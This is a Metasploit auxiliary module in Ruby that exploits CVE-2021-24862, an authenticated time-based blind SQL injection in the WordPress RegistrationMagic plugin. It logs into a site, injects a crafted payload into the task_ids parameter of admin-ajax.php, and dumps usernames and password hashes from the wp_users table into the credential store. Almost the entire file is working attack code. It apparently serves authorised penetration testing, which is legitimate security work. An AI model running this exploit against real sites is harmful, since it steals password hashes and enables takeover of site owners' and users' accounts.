##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress RegistrationMagic task_ids Authenticated SQLi',
        'Description' => %q{
          RegistrationMagic, a WordPress plugin,
          prior to 5.0.1.5 is affected by an authenticated SQL injection via the
          task_ids parameter.
        },
        'Author' => [
          'h00die', # msf module
          'Hacker5preme (Ron Jost)', # edb
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-24862'],
          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24862/README.md'],
          ['EDB', '50686'],
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2022-01-23',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Valid Username for login', '']),
      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])
    ]
  end

  def check_host(_ip)
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('custom-registration-form-builder-with-submission-manager', '5.0.1.6')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('RegistrationMagic version not vulnerable')
    end

    print_good('Vulnerable version of RegistrationMagic detected')
    checkcode
  end

  def run_host(ip)
    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])

    fail_with(Failure::NoAccess, 'Invalid login, check credentials') if cookie.nil?

    formid = Rex::Text.rand_text_numeric(2)
    vprint_status("Using formid of: #{formid}")
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      d = Rex::Text.rand_text_numeric(4)
      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => cookie,
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'page' => 'rm_ex_chronos_edit_task',
          'rm_form_id' => '2'
        },
        'vars_post' => {
          'action' => 'rm_chronos_ajax',
          'rm_chronos_ajax_action' => 'duplicate_tasks_batch',
          'task_ids[]' => "#{formid}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND (#{d}=#{d}"
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)
  end
end
